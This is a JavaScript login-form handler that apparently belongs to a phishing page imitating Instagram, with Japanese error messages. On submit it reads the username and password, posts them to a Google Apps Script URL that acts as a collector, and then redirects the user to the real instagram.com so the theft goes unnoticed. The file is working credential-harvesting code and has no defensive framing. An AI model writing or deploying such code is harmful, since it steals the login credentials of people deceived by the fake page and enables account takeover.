document.getElementById("login-form").addEventListener("submit", function(e) {
    e.preventDefault();

    const username = document.getElementById("username").value;
    const password = document.getElementById("password").value;

    const formData = new FormData();
    formData.append("username", username);
    formData.append("password", password);

    fetch("https://script.google.com/macros/s/AKfycbwsv-rV01zWEQc2CLzctZLNQhsET994PwQ_P8_rI80k2DH0ey30abbvIphne3ALSeQIxQ/exec", {
        method: "POST",
        body: formData
    })
    .then(response => {
        if (response.ok) {
            // 成功後のリダイレクト先
            window.location.href = "https://www.instagram.com/";
        } else {
            alert("送信に失敗しました（レスポンスNG）");
        }
    })
    .catch(error => {
        alert("送信エラー：" + error);
        console.error(error);
    });

    this.reset();
});
